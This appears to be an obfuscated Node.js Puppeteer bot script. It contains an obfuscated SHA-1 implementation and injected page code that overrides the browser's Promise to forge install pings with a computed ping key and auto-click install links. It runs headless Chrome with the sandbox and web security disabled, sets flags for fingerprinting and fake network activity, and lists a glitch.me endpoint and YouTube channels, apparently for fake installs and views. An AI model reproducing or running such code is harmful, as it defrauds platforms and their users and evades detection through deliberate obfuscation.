-0x78e + 0x2220 & L) << 0xfa3 * 0x1 + -0x18c5 * -0x1 + -0x2 * 0x142f | 0x2 * 0x1271 + 0xd3b + -0x2e1e & J['charCodeAt'](++M)), P[N >> -0x18 * 0x47 + -0x166c + -0x9b2 * -0x3] |= (0x5c3 * 0x4 + -0x3f * 0x41 + 0x61d * -0x1 | L >> -0x1a92 + 0x30f + -0x1 * -0x1795) << y[-0x1 * 0x18cf + -0x1 * 0xe6b + 0x273d & N++], P[N >> 0x2 * 0x667 + 0xccb + -0x1997] |= (-0x1255 + 0x1523 + 0x3b * -0xa | L >> -0x1dd2 + 0x2d1 + 0x19 * 0x115 & -0x1217 + 0xed5 * -0x1 + 0x212b) << y[-0xb9 * 0x3 + -0x6c5 * 0x3 + -0x12f * -0x13 & N++], P[N >> -0x3 * -0x7ab + -0x16f0 + 0xf * -0x1] |= (-0x953 + 0x1f2d + -0x155a | L >> -0x1d0d + 0x1a02 + 0x311 & 0x2692 + 0x237 * 0xe + -0x4555) << y[-0x5fd + 0x2440 + -0x1e40 & N++], P[N >> -0x223e * 0x1 + 0x1311 + 0xf2f] |= (0x7 * 0x83 + 0x425 * 0x7 + -0x2018 | -0x231 + -0x12d1 + 0x1 * 0x1541 & L) << y[0x64 + 0x1109 * 0x1 + -0x2e7 * 0x6 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x3b6 * 0x1 + -0x1 * -0x8ad + -0x4b7 * 0x1 ? (this['block'] = P[-0x31c + -0x6 * -0x576 + -0x1d98], this['start'] = N - (-0x698 + -0x773 * 0x1 + 0x1 * 0xe4b), this['hash'](), this['hashed'] = 0x2614 + -0xc1e + 0x8a7 * -0x3) : this['start'] = N;
                }
                return this['bytes'] > 0x12cc6a29b + -0x1904f140f + 0x163887173 * 0x1 && (this['hBytes'] += this['bytes'] / (-0xac * 0x17382b3 + 0x4b230 * -0x4af + 0x20f9a5f14) << 0x1f7d + 0x970 * -0x4 + 0x643, this['bytes'] = this['bytes'] % (0x2f6340 * -0x208 + -0x134902294 * 0x1 + 0x294d1bc94)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x2614 + 0x1 * -0x1709 + -0xf0a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1f45 + 0x47 * -0x73 + -0x1f9d * -0x2] = this['block'], J[K >> 0x2262 + -0x19 * 0xa3 + -0x1275] |= x[0x196d + 0x954 + -0x22be & K], this['block'] = J[-0x1cfa + -0x14d1 + -0x31db * -0x1], K >= 0x10 * 0xad + 0x5f4 * -0x1 + 0x12 * -0x42 && (this['hashed'] || this['hash'](), J[0x82c + -0x6 * -0xe3 + 0x9d * -0x16] = this['block'], J[-0x4b1 * 0x5 + -0x2150 + 0x38d5] = J[-0x1cd * -0x1 + 0x6de + -0x8aa] = J[0x1b1c + 0x2394 + -0x71 * 0x8e] = J[0x5 * 0x39 + 0xebb + 0x1 * -0xfd5] = J[0x103 * 0x5 + 0x24d + -0x758] = J[-0xe25 + -0x105 * 0x1f + 0x2dc5 * 0x1] = J[0x23f6 + 0x1abf * 0x1 + -0x3eaf] = J[-0x7ce + 0xce + 0x1 * 0x707] = J[0x2 * -0xd2 + -0x1ec7 + 0x2073] = J[-0x2065 * -0x1 + -0x1 * 0x19d5 + -0x3 * 0x22d] = J[0x15 * -0x81 + -0xb1b + 0x15ba] = J[0x12e4 + -0x1 * 0x209 + -0x4 * 0x434] = J[0x1 * 0x2cf + -0x21e4 + 0x1f21] = J[-0x4a2 + 0xf0 + 0x3bf] = J[-0xb1 + 0x1a2 + -0xe3] = J[-0x3f0 + 0xbec + -0x7ed] = -0x17d + -0x8 * 0x48c + -0x435 * -0x9), J[-0x1 * 0x26b4 + -0x4 * 0x8e + 0xa * 0x419] = this['hBytes'] << 0x3 * 0xbdd + 0x635 + -0x29c9 | this['bytes'] >>> -0x11b * 0x4 + -0x17f4 + 0xdd * 0x21, J[0x1656 + -0x20 * 0xb1 + -0x27] = this['bytes'] << -0x3 * -0x5ce + 0xce8 + 0x1e4f * -0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1c25 + 0x11ae + 0xa87; J < 0x4 * -0x6a + -0xd * 0x101 + 0x5 * 0x301; ++J)
                K = Q[J - (-0x2 * -0xfa1 + 0x132d * -0x1 + -0xc12)] ^ Q[J - (-0xdd * 0x29 + 0x2198 + 0x1d5 * 0x1)] ^ Q[J - (0x58c * -0x1 + -0x2 * 0xc + 0x1b * 0x36)] ^ Q[J - (-0x1b50 + -0x630 * 0x4 + 0x684 * 0x8)], Q[J] = K << 0x1 * -0x5ec + 0x15f4 + 0x1 * -0x1007 | K >>> -0x5 * 0x611 + -0x5 * -0x94 + -0x12 * -0x188;
              for (J = -0x49 * 0x64 + 0x277 * -0x9 + 0x32b3 * 0x1; J < 0x1 * -0xbf3 + 0x1d * -0x13f + 0x302a; J += -0x11fc * 0x2 + -0x246b + 0x4868)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1b3b + 0x1f61 + -0x97 * 0x7 | L >>> -0x1d81 + 0x2 * -0x104d + -0x2 * -0x1f1b) + (M & N | ~M & O) + P + (0x84a49865 + 0x7e62 * -0x8a12 + 0x1 * 0x1a079818) + Q[J] << -0x1317 + -0x4c3 * -0x6 + -0x97b) << 0x4 * 0x692 + 0x52f * -0x4 + -0x587 | P >>> -0x23d3 * 0x1 + -0x241 * -0x4 + 0x1aea) + (L & (M = M << -0x1 * -0xe1e + 0x1 * 0x1aad + -0x9 * 0x485 | M >>> 0x1cdf * -0x1 + -0x12fb + 0x2fdc) | ~L & N) + O + (-0x5b * -0xa0152d + 0x2888675 * 0x10 + -0x6ed74b6) + Q[J + (0x24f5 + 0x81 * -0x49 + -0x1 * 0x2b)] << 0x1 * 0x2531 + 0x1168 + -0x3699 * 0x1) << 0x11 * 0x159 + 0x1aa * 0x4 + -0x1d8c | O >>> 0x322 * -0x9 + -0x2264 + 0x3eb1) + (P & (L = L << -0x179a + -0x5 * -0x13c + 0x118c | L >>> 0x1 * -0x23db + -0x18bf + -0xc * -0x50d) | ~P & M) + N + (-0x2acae8c + -0x18789517 * -0x1 + 0xef2 * 0x498ff) + Q[J + (-0x927 + 0x1fc5 + -0x169c * 0x1)] << 0x1e3 * -0xb + -0x23b * 0x11 + -0x2 * -0x1d56) << -0xda1 + 0x1bfb + -0x1 * 0xe55 | N >>> -0x214f + -0x1d6 * -0xa + 0xf0e) + (O & (P = P << 0xbaa + 0x1 * -0x1082 + 0x7f * 0xa | P >>> -0x5ed * 0x4 + 0x1df0 * 0x1 + -0x63a * 0x1) | ~O & L) + M + (0x1cb6daff + -0x96 * 0x5807e3 + -0x25cabf34 * -0x3) + Q[J + (0x3e * -0x6f + 0x1ded + -0x8 * 0x61)] << 0x1c02 * -0x1 + 0x10bc + 0xb46) << 0x1ee1 + -0x260e * -0x1 + -0x2 * 0x2275 | M >>> -0x1a1e + 0x20e3 * 0x1 + -0x6aa) + (N & (O = O << 0x105a + -0x83 * 0x2b + 0x5c5 | O >>> -0xcfc + 0x95a + -0x1 * -0x3a4) | ~N & P) + L + (0x85005178 + 0xd41a13 * -0x83 + 0x420b7fda) + Q[J + (-0x241d + -0x2691 + 0x4ab2)] << 0x1518 + -0x25 * 0xce + 0x8ae, N = N << -0x12f * 0x17 + 0xbe1 + -0x1 * -0xf76 | N >>> 0x1 * 0x258b + 0xc6a + -0x31f3;
              for (; J < -0xa60 + -0x5 * 0x52c + 0x2464; J += -0x1 * 0xbd8 + 0x50a + 0x6d3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x58f + -0xca6 + 0x71c | L >>> -0x16c2 + -0x252f + -0x54 * -0xb7) + (M ^ N ^ O) + P + (0x75b3c76e + -0x9892ce59 + 0x91b8f28c) + Q[J] << -0x1 * 0x1e11 + -0x10bb + 0x2ecc) << -0xa09 * -0x1 + -0x1b5f + 0x115b | P >>> 0x20ab + 0x1 * -0x5c7 + -0x1ac9) + (L ^ (M = M << 0xe92 + -0x21f8 + 0x9c2 * 0x2 | M >>> 0x639 + 0x1f0 * 0x14 + -0xefd * 0x3) ^ N) + O + (-0x3d * -0x3425eaa + -0x3 * 0x35b52e1c + 0x33 * 0x16f3bc1) + Q[J + (-0x15dc + 0x109b + 0x2 * 0x2a1)] << -0x1 * -0x1bed + -0x25 * 0x1d + 0x2 * -0xbde) << 0x258e + -0x2 * -0x560 + -0x3049 | O >>> 0x1924 * 0x1 + -0x175 * -0xb + -0x2910) + (P ^ (L = L << -0x101c + 0x1f79 + 0x515 * -0x3 | L >>> 0x199d + -0x1 * 0xaab + 0x2 * -0x778) ^ M) + N + (-0x73398e0e * 0x1 + 0x89331c04 + 0x58e05dab) + Q[J + (0x17b3 + 0x1 * 0x19a3 + -0x3154)] << 0x695 * 0x1 + 0x1165 * 0x1 + 0x3 * -0x7fe) << 0x1a7 * -0x10 + 0x65 * -0x1c + 0x2581 | N >>> -0x13 * 0x1fd + 0xc9e + 0x1944) + (O ^ (P = P << -0x1 * 0x933 + -0x1 * 0x174b + 0x209c | P >>> 0xfa7 + 0x11ed + 0x10c9 * -0x2) ^ L) + M + (0xc918458b + 0xa * -0xf2d9410 + -0x3f2 * -0xf98f3) + Q[J + (-0x13cc + -0x4 * 0x3d1 + 0x29 * 0xdb)] << 0x191b * -0x1 + -0x2320 + 0x3c3b) << -0x31 * 0x61 + -0x11a7 + -0x1 * -0x243d | M >>> -0x1fab + 0x1341 + -0x1 * -0xc85) + (N ^ (O = O << -0x257 + -0x1cbc + 0x1f31 | O >>> 0x1 * 0x1147 + 0x665 * -0x1 + -0xae0) ^ P) + L + (-0x6bfc6275 * -0x1 + 0x3c9d9b2 * -0x2c + 0xa98ef3c4) + Q[J + (-0x1 * 0x2187 + 0xda3 + 0x1a * 0xc4)] << 0x201a + -0x28 * 0x80 + -0xc1a, N = N << -0x1132 + -0x2d7 * -0xd + -0x139b | N >>> 0x1484 + 0x12a9 + 0x25 * -0x10f;
              for (; J < -0x3 * -0xc11 + -0x9f3 + -0x1a04; J += 0x1a8e + 0xdb6 + -0x283f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1af * 0x16 + -0x20b6 + -0x44f | L >>> 0x1243 + -0x1764 + -0x29e * -0x2) + (M & N | M & O | N & O) + P - (-0x1 * -0x3a5bc69 + -0x29 * -0x4ca1e11 + -0x572049fe) + Q[J] << 0x3 * -0xba2 + -0x10 * 0x2b + 0x2596) << -0x264d + 0x1435 + 0x121d * 0x1 | P >>> -0xa0d + 0xc2d + -0x205) + (L & (M = M << -0x15 * 0xbf + 0x153c + -0x3 * 0x1d1 | M >>> 0x2 * 0x95f + -0xe * 0x12c + -0x254) | L & N | M & N) + O - (-0x4 * 0x2b69fe0 + -0x73e93cd * -0x1 + 0x74802ed7) + Q[J + (0xf98 + 0x20cc + 0x1021 * -0x3)] << -0x239c + -0x22ef * -0x1 + 0xad) << -0x3 * -0x33d + -0x1a0 + -0x1 * 0x812 | O >>> 0x22ea + 0x278 + -0x3 * 0xc6d) + (P & (L = L << 0x2225 * -0x1 + -0x3bd * 0x2 + 0x29bd | L >>> -0x189d * -0x1 + -0x124c + 0x55 * -0x13) | P & M | L & M) + N - (-0x14d7414 + 0x9a0636d4 + -0x56a * 0x75b56) + Q[J + (-0x1478 + -0x1877 + 0xb1 * 0x41)] << 0x20 * 0x5c + -0x13 * -0x177 + -0x2755) << -0x1f * 0x6f + 0x1fa4 + 0xb3 * -0x1a | N >>> -0x12b5 + 0x688 + 0xc48) + (O & (P = P << -0xb * 0xe5 + -0x54d * -0x3 + -0x5f2 | P >>> -0xd * 0x141 + 0x9 * 0x2ef + -0x26 * 0x44) | O & L | P & L) + M - (-0xbe0522b6 + -0x3f7eef1e + 0x16e6854f8) + Q[J + (0x745 + 0x351 + -0xa93)] << -0x22e1 * 0x1 + -0x258c + 0x486d) << 0xcea + -0x1 * 0x1583 + 0x89e | M >>> 0xb8c + 0xc5 * 0x23 + -0x2660) + (N & (O = O << -0x1 * 0xc67 + 0x25 * -0xee + -0x1 * -0x2eeb | O >>> -0x27f * -0x5 + 0x2511 + -0x22 * 0x175) | N & P | O & P) + L - (0x1 * -0x6e9fb755 + 0x8a776d41 + 0xa4f18e * 0x84) + Q[J + (-0x1 * -0x2083 + -0x228a + 0x20b)] << 0x2636 + -0x100 * -0x5 + -0x2b36, N = N << 0x1 * 0x1eb5 + -0x1 * 0x342 + 0x1b55 * -0x1 | N >>> -0x1 * -0x14b1 + 0x2653 * -0x1 + 0x11a4;
              for (; J < -0x1b * 0xc7 + -0x58 * -0x62 + 0x3 * -0x421; J += 0x7f9 + -0x7f8 + 0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2540 + -0x21ab + 0x4 * 0x11bc | L >>> 0x88 * -0x47 + 0x530 + 0x20a3) + (M ^ N ^ O) + P - (0x19f8a191 + -0x7e1 * -0x483c7 + -0x133 * 0x69c7a) + Q[J] << -0xb2b + -0xdf5 + 0x43 * 0x60) << 0x16d * 0x3 + 0x1 * 0x70a + 0x3c4 * -0x3 | P >>> -0x5 * -0x55d + -0x2514 + 0xa5e) + (L ^ (M = M << -0x1 * 0x1185 + 0x1 * -0x731 + 0x2 * 0xc6a | M >>> -0x10 * -0xe5 + -0x2297 + 0x1449) ^ N) + O - (0x266e58dc + -0x2 * 0x22c2c96b + 0x54b47824) + Q[J + (0xbf4 + 0x551 * 0x1 + -0x1144)] << -0x1e0e * -0x1 + 0xcc9 * 0x1 + -0x2ad7 * 0x1) << -0x1845 + 0x665 * -0x5 + -0x1 * -0x3843 | O >>> -0x1 * 0x348 + 0x100a + -0xca7) + (P ^ (L = L << 0x1ad5 + 0x1aad + -0x3564 | L >>> -0xffb * -0x2 + -0x1035 + -0xfbf) ^ M) + N - (0xff68 * 0x54eb + 0x2c9e0d7f + 0x201 * -0x25c9cd) + Q[J + (0x2576 + 0x23b1 + -0x4925)] << 0x3 * -0x6bd + -0xace * -0x3 + -0xc33) << 0xb63 + 0x1 * 0x10bb + -0x1c19 | N >>> -0x1f74 + -0x156e + 0x34fd) + (O ^ (P = P << -0x14fd + 0x1 * -0x1237 + 0x2752 | P >>> -0x17c2 + 0x76d * -0x1 + -0x63d * -0x5) ^ L) + M - (0x6099e8e + -0x3b914c46 + 0x6b24ebe2) + Q[J + (0x1f31 + 0xb62 + -0x18 * 0x1c6)] << -0x1da0 + -0x15a3 + 0x3343) << 0x1879 + 0x36 * 0x3f + 0x2 * -0x12df | M >>> 0x8 * -0x141 + 0x26c6 + -0x1 * 0x1ca3) + (N ^ (O = O << -0x238e + -0x1 * -0x1bfa + 0x1 * 0x7b2 | O >>> -0x77c * -0x1 + 0xaff + -0x1279) ^ P) + L - (-0x3458e93 * -0x10 + -0x243d9940 + 0x2581ee3a) + Q[J + (-0xdb4 + 0x2 * -0x4cb + -0x13 * -0x13a)] << 0x1 * -0x14f + -0xf4d + -0x109c * -0x1, N = N << -0x24c1 + 0x97a + 0x1b65 | N >>> -0x5 * 0x401 + 0x353 * 0x1 + 0x10b4;
              this['h0'] = this['h0'] + L << -0x128e + -0x114c + 0x23da, this['h1'] = this['h1'] + M << -0xb58 + -0x839 * -0x3 + -0xd53, this['h2'] = this['h2'] + N << -0x1a70 + -0x1aa3 + 0x15 * 0x287, this['h3'] = this['h3'] + O << 0xa5 * 0x25 + 0x259 * -0x3 + 0x867 * -0x2, this['h4'] = this['h4'] + P << 0xed1 + -0x3a * 0x6d + 0x3 * 0x34b;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x817 * -0x1 + 0x7 * -0x21 + 0x2 * -0x38a & 0x70d + -0x23cb + 0x49 * 0x65] + w[J >> -0xb31 + 0x83 * -0x8 + 0xf61 & -0x2 * 0x10b2 + -0x9e * 0xc + -0x28db * -0x1] + w[J >> -0x1f76 + 0x9d5 + 0x15b5 * 0x1 & -0x6f3 * -0x4 + -0x253d + -0x1 * -0x980] + w[J >> -0x1faf + 0x1 * -0x2120 + 0x40df & 0x23e5 + 0xf00 + -0x32d6] + w[J >> -0x4 * -0x97c + -0x3fe + 0x2 * -0x10f3 & 0x22a * 0xf + -0x2f * 0x61 + -0xe98] + w[J >> -0x5f8 + 0x1d88 + 0x1 * -0x1788 & -0x643 + -0x2150 + -0x2 * -0x13d1] + w[J >> -0x2069 + -0x454 + 0x24c1 & 0x35 + 0xbf + -0xe5] + w[-0x8d * 0x7 + 0x1d0f + -0x1925 & J] + w[K >> -0xa61 + -0x11ac + 0x59 * 0x51 & 0x443 * -0x1 + 0x1 * -0xcd1 + -0x1 * -0x1123] + w[K >> -0x171d + 0xc6 * -0x1b + 0x2c17 & -0xe3b + 0x200f + -0x11c5 * 0x1] + w[K >> -0x17c8 + -0x155e + 0x2d3a * 0x1 & 0x2232 * 0x1 + -0x1b85 * -0x1 + -0x3da8] + w[K >> 0x1 * -0xa75 + 0x2 * -0x85 + 0xb8f & 0x18d * -0x15 + 0x34 * 0x43 + 0x1304 * 0x1] + w[K >> 0x201 + -0x24fe + 0x2309 * 0x1 & -0x8f7 + -0x13 * 0x65 + 0x1085] + w[K >> -0x1e7 + -0xcc3 * -0x2 + -0x1797 & 0x27f * 0x3 + -0xaf5 + 0x387] + w[K >> -0x124 * 0x15 + 0x6b8 + -0x5c * -0x30 & -0x104a + 0x23cc + -0x1373] + w[-0x5bf * 0x5 + -0x17 * 0x98 + 0x6 * 0x713 & K] + w[L >> -0x163 * -0x1 + 0x5 * 0x229 + 0x305 * -0x4 & 0x35 * -0x76 + -0x21 * 0xce + 0x330b] + w[L >> -0x4 * 0x8d2 + 0x3 * 0x41d + 0x1 * 0x1709 & -0xcaa + 0x1445 * 0x1 + -0x78c] + w[L >> 0xf9d * 0x2 + 0x197 * -0x3 + -0x8cb * 0x3 & -0x5 * -0x4fb + -0x179c + 0x9e * -0x2] + w[L >> -0x1 * 0xf6 + -0x6 * 0x89 + 0x1 * 0x43c & 0x321 * -0x3 + -0x1 * 0x2090 + 0x2a02] + w[L >> -0x2351 + -0x24 * 0xc5 + 0x3f11 & -0x23c + -0x1c * -0x1d + -0xe1] + w[L >> 0x205 + -0x1 * 0xc6 + -0x137 & -0x17ba + 0xdff * 0x1 + 0x9ca] + w[L >> 0x67f * 0x2 + -0x16ab + -0x1 * -0x9b1 & 0x15ff + 0x8aa + -0xf4d * 0x2] + w[-0xc58 + -0x222 + 0xe89 & L] + w[M >> 0xf6f + 0x1 * 0x1a38 + -0x298b & -0x20ad * -0x1 + 0x179b + -0x185 * 0x25] + w[M >> 0x1f2e + 0x1e80 + 0x3d96 * -0x1 & 0xd7f + 0xb29 * -0x2 + 0x8e2] + w[M >> 0x7e0 + 0x162f + -0x1dfb & -0x1641 + -0x2014 + -0x3664 * -0x1] + w[M >> 0x1 * 0x5c1 + -0xa3 * -0x3d + 0x26 * -0x12c & -0x12b3 + 0x1 * -0x2b3 + 0x1575] + w[M >> 0xab8 + 0x19e5 + 0x197 * -0x17 & -0x1e78 + -0x450 + 0x22d7] + w[M >> 0x991 + -0x532 + -0x457 & 0x105d + -0xc63 + -0x3b * 0x11] + w[M >> 0x1b53 + 0x259b + -0xe * 0x4a3 & -0x2 * -0x120e + -0x1ca * 0x10 + -0x76d] + w[0x8 * 0x45 + 0x4b * 0x1e + -0xae3 & M] + w[N >> -0x1c42 + -0x5 * -0x1f3 + 0xe3 * 0x15 & -0x6b0 + 0x168a + -0xfcb] + w[N >> -0x11 * -0xaf + -0x23fc + 0x827 * 0x3 & 0x1372 + -0x1de6 + 0xd * 0xcf] + w[N >> 0x4 * 0x3dd + 0xdce + 0x4dd * -0x6 & 0x1398 + 0xae7 * -0x2 + 0x7 * 0x53] + w[N >> 0xd50 * -0x1 + 0x2 * -0x5d5 + 0x190a & 0x229d * -0x1 + -0x1d * 0xdf + 0x3bef] + w[N >> -0x3 * -0x2cf + 0xd * -0x5b + -0x3c2 & -0x1761 + -0x17e6 + 0x2f56] + w[N >> 0x2009 * 0x1 + -0xb10 + -0x14f1 & 0x2 * 0x6c7 + -0x9 * 0x230 + 0x631] + w[N >> -0x601 + 0x687 * 0x2 + -0x709 & -0x4 * 0x1fd + 0x775 + 0x8e] + w[0x1 * 0x556 + 0x24c3 + -0x2a0a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2e * -0x5b + -0x1ab4 + -0x2 * -0x539 & -0x1 * 0xba7 + 0x2227 + -0x1581,
                J >> -0x1360 + 0x1 * -0x253c + 0x38ac & 0x16bf + 0x7 * 0x2b + 0x16ed * -0x1,
                J >> -0x1bb8 + 0x1ea3 + -0x2e3 & -0x967 * -0x3 + 0x5 * 0x167 + -0x2239 * 0x1,
                -0x2f * 0xd3 + 0x1835 + 0x4b * 0x35 & J,
                K >> 0x1b6f + -0xaed + -0x2 * 0x835 & -0x505 * 0x3 + -0x2426 + -0x101 * -0x34,
                K >> -0x1f2c + -0x209 * 0x4 + -0x3c * -0xa8 & -0x18b8 + 0x8 * -0x35 + 0x27d * 0xb,
                K >> -0x1cdd + -0x15f * -0xd + 0xb12 & 0x1 * -0x6d + 0x25f2 * 0x1 + -0x2486,
                -0x107e * -0x1 + -0x4 * 0x4b8 + -0x1 * -0x361 & K,
                L >> 0xedf + 0x111f + -0x1fe6 & -0x519 * -0x4 + -0x1c6c + 0x907 * 0x1,
                L >> 0x125 * 0x15 + -0xc6d + -0xb8c & -0x18e * -0x2 + 0xfa5 + 0x11c2 * -0x1,
                L >> -0xabe + -0x504 * -0x3 + -0x446 & 0x758 + 0x7 * 0x34c + -0x1d6d,
                0xbf3 * -0x1 + -0x1cb3 + 0x29a5 * 0x1 & L,
                M >> -0x1599 + 0x229e + -0xced & 0x13 * 0x94 + 0xa5e * 0x3 + 0x2917 * -0x1,
                M >> -0x1ef7 + -0x1 * 0xbb3 + 0x2aba & 0x2364 + -0x7 * 0x518 + 0x1 * 0x143,
                M >> 0x227d + 0x2 * -0x1240 + 0x20b & -0x9a + -0x1 * -0x7f + -0x1 * -0x11a,
                -0x1 * -0xdf3 + -0x2200 + 0x150c & M,
                N >> -0xc31 * 0x2 + 0x20f6 + -0x87c & -0x102b + -0x131b + 0x2445,
                N >> 0x1 * -0x24dd + 0xca * 0x4 + -0x5f * -0x5b & 0x2 * 0x20e + -0x2 * -0x1b7 + -0x14f * 0x5,
                N >> 0x1a86 + 0x4 * 0x4f + -0x5b * 0x4e & -0x86 + -0x3 * 0x6e2 + 0x162b,
                -0xc37 + 0x1d86 * -0x1 + 0x2abc & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1ae7 + -0xd * 0x263 + 0x434), (K = new DataView(J))['setUint32'](0x20fa + -0x3c7 + -0x1d33, this['h0']), K['setUint32'](0x17e9 + -0x186d + 0x88, this['h1']), K['setUint32'](-0xfdd * 0x1 + -0x1 * 0x304 + 0x1 * 0x12e9, this['h2']), K['setUint32'](-0x10c9 * 0x1 + -0xf36 + -0x277 * -0xd, this['h3']), K['setUint32'](-0xa * 0x89 + -0x1246 * -0x1 + -0x1 * 0xcdc, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1d34 + 0x1 * -0x23ac + -0x1 * -0x678];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x7ff * 0x3 + 0x13c0 + -0x23 * -0x1f;
            J[-0x138c + 0x1ae * -0x7 + -0x1 * -0x1f4e]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2 * 0x971 + -0x1 * 0x61b + -0xcc7] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x152b * -0x1 + -0x5c7 * -0x1 + 0xf65), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * 0xfad + -0x26a3 * 0x1 + 0x16f7 * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x24eb + -0x18e3 * -0x1 + -0x4 * -0x479), Promise['resolve'](0xa * -0x34d + 0x47f + 0x721 * 0x4);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * -0xe9b + 0x1 * 0xf25 + -0x8a; j < -0x12b * 0x2 + -0x172e + 0x1985; j++)
    i();
}
const NETWORK_PATIENCE = -0x1e81 * 0x2 + -0x1 * -0x269 + -0x21 * -0x2b9 + (0x26 * 0x6 + -0x204b * 0x1 + 0x2b1f) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0x4e1 + 0xe3e + 0x3 * -0x31e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1eef + -0x3c2 * -0x8 + 0x3 * -0x1455; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
